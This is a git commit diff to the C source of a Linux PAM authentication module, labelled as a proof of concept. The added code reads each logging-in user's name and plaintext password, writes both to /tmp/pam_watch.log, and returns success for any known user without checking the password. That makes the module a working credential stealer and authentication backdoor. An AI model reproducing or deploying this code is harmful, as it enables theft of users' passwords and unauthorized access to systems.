2c70c3c31afe5cc3cf2fe8fe4e6e25df3bd7cd2f
David Rabkin <david@rabkin.co.il>
2021-02-28 19:43:43 +0200

    Proove of concept, report user name and password

--- main.c
+++ main.c
@@ -1,9 +1,12 @@
 #include <errno.h>
+#include <pwd.h>
 #include <security/pam_modules.h>
 #include <security/pam_ext.h>
 #include <stdarg.h>
 #include <stdio.h>
 #include <string.h>
+#include <sys/types.h>
+#include <unistd.h>
 
 static int report(const char *fmt, ...) {
   const char fname[] = "/tmp/pam_watch.log";
@@ -34,10 +37,27 @@ PAM_EXTERN int pam_sm_authenticate(
   int flags,
   int argc,
   const char **argv) {
-  (void)handle;
   (void)flags;
   (void)argc;
   (void)argv;
-  report("Welcome, foobar\n");
+  const char *pass;
+  const char *user;
+  int rc = pam_get_user(handle, &user, NULL);
+  if (rc != PAM_SUCCESS) {
+    report("Unable to read user name: %s\n", pam_strerror(handle, rc));
+    return rc;
+  }
+  struct passwd *pwd = getpwnam(user);
+  if (NULL == pwd) {
+    report("Unknown user %s\n", user);
+    return PAM_USER_UNKNOWN;
+  }
+  rc = pam_get_authtok(handle, PAM_AUTHTOK, &pass, NULL);
+  if (rc != PAM_SUCCESS) {
+    report("Unable to read pass for user %s: %s\n",
+        user, pam_strerror(handle, rc));
+    return rc;
+  }
+  report("Hello, %s with %s.\n", user, pass);
   return PAM_SUCCESS;
 }
